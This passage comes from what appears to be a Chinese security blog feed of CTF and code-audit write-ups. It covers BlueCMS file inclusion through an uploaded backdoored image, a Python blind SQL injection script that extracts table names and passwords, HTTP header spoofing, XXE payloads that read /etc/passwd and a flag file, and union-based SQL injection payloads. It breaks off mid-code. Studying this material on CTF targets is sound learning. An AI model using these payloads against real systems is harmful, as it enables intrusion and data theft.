title="文件包含"></a>文件包含</h3><p>在用户修改头像功能处上传任意携带后门的jpg文件，获取到路径<code>data/upload/face_pic/16303030511.jpg</code>然后利用文件包含漏洞执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830140130531.png" alt="image-20210830140130531"></p><blockquote><p>%00截断：条件：magic_quotes_gpc = Off，PHP版本&lt;5.3.4</p><p>路径长度阶段：条件：windows 下目录路径最大长度为256字节，超出部分将丢弃；linux 下目录最大长度为4096字节，超出长度将丢弃；PHP版本&lt;5.2.8</p></blockquote><p>这里由于PHP版本不合适就先没有继续测试了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个CMS是一个非常简单的适合入门审计的，这里面的漏洞不难，主要是需要掌握审计代码的思路与方法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BlueCMS&quot;&gt;&lt;a href=&quot;#BlueCMS&quot; class=&quot;headerlink&quot; title=&quot;BlueCMS&quot;&gt;&lt;/a&gt;BlueCMS&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;BlueCMS__v1.6_sp1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>二分法盲注</title>
    <link href="http://example.com/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-01-18T15:26:54.000Z</published>
    <updated>2021-09-27T03:52:35.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>查看第五个数字的时候，发现提示</p><p><img src="https://i.loli.net/2021/01/11/3dq6OA5SfCjtpN9.png" alt="image-20210111205316927"></p><p>访问一下第六个数字</p><p><img src="https://i.loli.net/2021/01/11/HRlzg9heOyEaQtq.png" alt="image-20210111205350930"></p><blockquote><p>看了一下wp，这里提示需要使用异或盲注</p></blockquote><p>使用盲注查看数据库的长度</p><p><img src="https://i.loli.net/2021/01/11/qIypWltXKP7g1iJ.png" alt="image-20210111205926348"></p><blockquote><p>:open_mouth: 是不是哪里弄错了</p><p>检查之后发现我把异或的基本判断定理都弄错了 我是憨憨</p><p>修改payload，写脚本盲注</p></blockquote><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haskell">// 脚本<br>// 二分法<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-title">url</span> = <span class="hljs-string">&quot;http://8b15efee-ef59-4f8e-83dd-660824e442eb.node3.buuoj.cn/search.php&quot;</span><br><span class="hljs-title">flag</span> = &#x27;&#x27;<br><br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>    hight = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">31</span><br>    while hight&gt;=low:<br>        mid = (hight+low)// <span class="hljs-number">2</span><br>        # <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&#x27;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>(<span class="hljs-title">database</span>(),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125;  # 查表名  geek</span><br>        # <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>))<span class="hljs-title">from</span>(<span class="hljs-title">information_schema</span>.<span class="hljs-title">tables</span>)<span class="hljs-title">where</span>(<span class="hljs-title">table_schema</span>)=&#x27;<span class="hljs-title">geek&#x27;</span>),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; # 查库名 <span class="hljs-type">F1naI1y</span></span><br>        #<span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">column_name</span>))<span class="hljs-title">from</span>(<span class="hljs-title">information_schema</span>.<span class="hljs-title">columns</span>)<span class="hljs-title">where</span>(<span class="hljs-title">table_name</span>)=&#x27;<span class="hljs-type">F1naI1y</span>&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; #查字段 id userh</span><br>         <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">password</span>))<span class="hljs-title">from</span>(<span class="hljs-title">geek</span>.<span class="hljs-type">F1naI1y</span>)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; # 查字段值</span><br>        response = requests.get(url,params=<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>        s = response.text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;others~~~&quot;</span> <span class="hljs-keyword">in</span> s:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            hight = mid - <span class="hljs-number">1</span><br>    f = int((low+hight+<span class="hljs-number">1</span>))//<span class="hljs-number">2</span><br>     <span class="hljs-keyword">if</span>(f==<span class="hljs-number">127</span> or f==<span class="hljs-number">31</span>):<br>         break<br>    flag = flag + chr(f)<br>    print(flag)<br><br></code></pre></td></tr></table></figure><blockquote><p>可能是由于buu平台的原因，脚本执行过久就会出现错误，但是主要是要学会对sql盲注的脚本编写，并且熟练掌握二分法</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;极客大挑战-2019-FinalSQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-FinalSQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]FinalSQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]FinalSQL&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>HTTP特殊请求头</title>
    <link href="http://example.com/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
    <id>http://example.com/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/</id>
    <published>2021-01-18T13:57:40.000Z</published>
    <updated>2021-01-18T13:59:45.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近做了一道CTF的题，里面应用了http的各种头，记录下来学习学习</p></blockquote><h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><h3 id="打开题目"><a href="#打开题目" class="headerlink" title="打开题目"></a>打开题目</h3><p><img src="https://i.loli.net/2020/12/20/NqxatShcbRrQwyj.png" alt="image-20201220223807400"></p><blockquote><p>尝试弱口令登录与SQL注入</p></blockquote><p>抓包</p><p><img src="https://i.loli.net/2020/12/20/Kwq5lz42gfh9oCA.png" alt="image-20201220224157732"></p><p>修改时间，然后发现新线索</p><p><img src="https://i.loli.net/2020/12/20/OWMv6lu5HycxE7g.png" alt="image-20201220224129130"></p><p>使用**<em>Client-ip: 127.0.0.1**</em> ,又出现新的线索</p><p><img src="https://i.loli.net/2020/12/20/8W1zlVCqOQEtvN6.png" alt="image-20201220224438421"></p><p>使用*** Referer: gem-love.com *** 又有新提示</p><p><img src="https://i.loli.net/2020/12/20/ZbgB52qGpS6n8Xl.png" alt="image-20201220224558708"></p><p>这里有个坑，需要使用Commodo 64的全称，Commodore 64；</p><p><strong>* User-Agent： Commodore 64*</strong> </p><p><img src="https://i.loli.net/2020/12/20/rVhP4yswMF38g1k.png" alt="image-20201220225317596"></p><p>指定邮箱*** From: <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#103;&#x65;&#x6d;&#x2d;&#x6c;&#x6f;&#x76;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x72;&#111;&#111;&#116;&#64;&#103;&#x65;&#x6d;&#x2d;&#x6c;&#x6f;&#x76;&#x65;&#x2e;&#99;&#111;&#x6d;</a>***</p><p><img src="https://i.loli.net/2020/12/20/eWg5bEnzAyQfTkY.png" alt="image-20201220225553050"></p><p>指定服务器**<em>Via: y1ng.vip**</em></p><p><img src="https://i.loli.net/2020/12/20/AxtY9Kzbp2UhNiZ.png" alt="image-20201220225711978"></p><p>base64解码即可</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个题目本身不难，主要考的就是**<em>请求首部字段**</em>的熟练使用</p><table><thead><tr><th>Header</th><th>作用</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td></tr><tr><td>Referer</td><td>先前的网址，当前请求的网页紧随其后，即来路</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td></tr><tr><td>From</td><td>发出请求的用户的Email</td></tr><tr><td>Cookie</td><td>存储cookie信息</td></tr><tr><td>User-Agent</td><td>包含发出请求的用户信息</td></tr><tr><td>TE</td><td>客户端接受的传输编码，通知服务器接受尾加头信息</td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近做了一道CTF的题，里面应用了http的各种头，记录下来学习学习&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;BJDCTF-2nd-假猪套天下第一&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd-假猪套天下第一&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-17T14:45:34.000Z</published>
    <updated>2021-01-17T14:46:11.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XXE漏洞</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Injection)全称为<span class="hljs-type">XML</span>外部实体注入<br><br><span class="hljs-type">XML</span>：设计用来传输与显示数据，其焦点是数据的内容<br>HTML：设计用来显示数据，其焦点是数据的外观<br><br><span class="hljs-type">XML</span>文档类型定义，即DTD。XXE漏洞所在的地方<br>XXE漏洞的触发点一般发生在可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致恶意的<span class="hljs-type">xml</span>文件被上传。<br></code></pre></td></tr></table></figure><h4 id="XML基本了解"><a href="#XML基本了解" class="headerlink" title="XML基本了解"></a>XML基本了解</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs xml">xml的注意要求：<br>1. 所有xml元素都必须有关闭标签<br>2. xml标签对大小写敏感<br>3. xml必须正确嵌套<br>4. xml文档必须有根元素<br>5. xml的属性值必须加引号<br><br>xml文档的注释：<span class="hljs-comment">&lt;!-- --&gt;</span><br><br>DTD(文档类型定义)：可定义合法的xml文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可以作为一个外部引用<br><br>DTD的三种应用形式：<br>1. 内部DTD文档  <span class="hljs-meta">&lt;!DOCTYPE 根元素[定义内容]&gt;</span><br>2. 外部DTD文档  <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD文件路径&quot;</span>&gt;</span><br>3. 内外DTD结合  <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD文件路径&quot;</span> [定义内容]&gt;</span><br><br>DTD实体：<br>用于定义引用普通文本或特殊的快捷方式变量；实体引用是对实体的以用；实体可在内部或外部进行声明。<br>实体分为：一般实体和参数实体<br>一般实体的声明方法：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体内容&quot;</span>&gt;</span>  引用一般实体的方法：&amp;实体名称<br>* 一般实体可以在DTD，xml，声明前，实体声明内部引用<br>参数实体的声明：<span class="hljs-meta">&lt;!ENTITY % 实体名称 <span class="hljs-meta-string">&quot;实体内容&quot;</span>&gt;</span>  引用参数实体的方法：%实体名称<br>* 参数实体只能在DTD中引用<br>内部实体：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span> &gt;</span> <br>例：<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-string">&quot;hello&quot;</span>&gt;</span>]&gt;</span> <br>   <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br>外部实体：用来引入外部资源，有SYSTEM 和 PUBLIC 两个关键字，表示实体来自本地计算机还是公共计算机<br><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URL&quot;</span>&gt;</span><br><br>外部实体的引用可以利用如下协议：<br>file:///path/to/file.txt<br>http://url/file.txt<br>php://filter/read=convert.base64-encode/resource=flag.txt<br><br>外部实体可以支持http,file 等协议，所以可以通过引用外部实体进行远程文件读取<br>例：<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xdsec</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">methodname</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span>(实体引用名) <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>(实体内容) &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span><br>这里的xml外部实体xxe被赋予的值为file:///etc/passwd 当解析xml文档时，&amp;xxe会被替换为file:///ect/passwd的内容，导致敏感信息泄露<br></code></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>此题就是一个简单的xxe攻击</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">payload:</span><br><span class="php"><span class="hljs-meta">&lt;?</span> xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELENENT <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">person</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;person;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/01/SMizh13REwGK4NJ.png" alt="image-20210101221407136"></p><blockquote><p>flag的位置是猜出来的</p></blockquote><p><strong>XXE漏洞后期可以专门学习一下</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF2019-Fake-XML-cookbook&quot;&gt;&lt;a href=&quot;#NCTF2019-Fake-XML-cookbook&quot; class=&quot;headerlink&quot; title=&quot;[NCTF2019]Fake XML cookbook&quot;&gt;&lt;/a&gt;[NCTF20</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>无列名注入</title>
    <link href="http://example.com/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
    <published>2021-01-17T14:43:37.000Z</published>
    <updated>2021-01-17T14:44:34.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><blockquote><p>2021.1.16</p></blockquote><p>这题确实不会，查看大佬的wp</p><blockquote><p>需要利用MariaDB的一些特性</p></blockquote><h3 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">MariaDB数据库可以利用 mysql.innodb_table_stats 查表名<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_table_stats<br></code></pre></td></tr></table></figure><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p><img src="https://i.loli.net/2021/01/16/A84hlyWBDit2JRv.png" alt="image-20210116224446299"></p><blockquote><p>正常查询时列名正常显示</p></blockquote><p><img src="https://i.loli.net/2021/01/16/y132WJfRGQIiXsY.png" alt="image-20210116224526741"></p><blockquote><p>使用联合查询，这时列名发生了变化</p></blockquote><p><strong>这里可以利用这个方式在不知道列名的情况下查询内容</strong></p><p><img src="https://i.loli.net/2021/01/16/YrJjZqGx57L2OwT.png" alt="image-20210116224644826"></p><blockquote><p>使用反引号和别名，直接获取到了单列的值</p></blockquote><p>反引号禁用时</p><p><img src="https://i.loli.net/2021/01/17/WZLItMnwHgpuEea.png" alt="image-20210116224745966"></p><blockquote><p>这里直接利用了取别名的方式，没有使用反引号</p></blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">相关学习文章</a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><blockquote><p>二次注入</p></blockquote><p>直接将广告名写为<code>1’</code>,保存后查看</p><p><img src="https://i.loli.net/2021/01/16/X7spl92mhPaSAVj.png" alt="image-20210116231225422"></p><blockquote><p>这题需要在申请广告的广告名处注入，之前搞错了…… 拿着id怼了半天……</p></blockquote><p><img src="https://i.loli.net/2021/01/16/yTW5QDNOxFw6iA3.png" alt="image-20210116233000715"></p><p><img src="https://i.loli.net/2021/01/16/qCaRDUL7fNQ89PT.png" alt="image-20210116232950459"></p><blockquote><p>这里报错字段长度不对劲</p></blockquote><p><img src="https://i.loli.net/2021/01/16/wNePUZ6cGOmBEAT.png" alt="image-20210116233057745"></p><p><img src="https://i.loli.net/2021/01/16/AS4xrPyTJiYIgh5.png" alt="image-20210116233047870"></p><blockquote><p>多次尝试发现字段长度为22并且回显的地方为2，3两处</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">查库：<span class="hljs-number">-1</span>&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,user(),group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/16/eaVDdcNtIFxEb4r.png" alt="image-20210116233316001"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">payload:<br>-1&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(a)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">as</span><span class="hljs-comment">/**/</span>a<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span>)x),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/cjwNtdGaRMoLy1C.png" alt="image-20210117000629293"></p><blockquote><p>此题主要掌握无列名查询与查询表名的新方法</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SWPU2019-Web1&quot;&gt;&lt;a href=&quot;#SWPU2019-Web1&quot; class=&quot;headerlink&quot; title=&quot;[SWPU2019]Web1&quot;&gt;&lt;/a&gt;[SWPU2019]Web1&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;2021.1.16&lt;/</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020-岁末赛</title>
    <link href="http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <id>http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/</id>
    <published>2020-12-30T13:44:22.000Z</published>
    <updated>2020-12-30T13:47:13.319Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><em>WEB</em></h2><h3 id="EZ-JS"><a href="#EZ-JS" class="headerlink" title="EZ_JS"></a>EZ_JS</h3><p><img src="https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png" alt="image-20201224123233716"></p><p><img src="https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png" alt="image-20201224123259063"></p><p>这里有个好用的颜码解码网站：<a href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></p><a id="more"></a><h3 id="EZ-RCE"><a href="#EZ-RCE" class="headerlink" title="EZ_RCE"></a>EZ_RCE</h3><p>爆破md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1000000000000000000000</span>):<br>    i=str(i)<br>    h=hashlib.md5()<br>    h.update(i.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    a = h.hexdigest()<br>    <span class="hljs-keyword">if</span>( a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&quot;7b6db2&quot;</span> ):<br>        print(i)<br>        <span class="hljs-keyword">break</span><br>        <br> //<span class="hljs-number">2708999</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 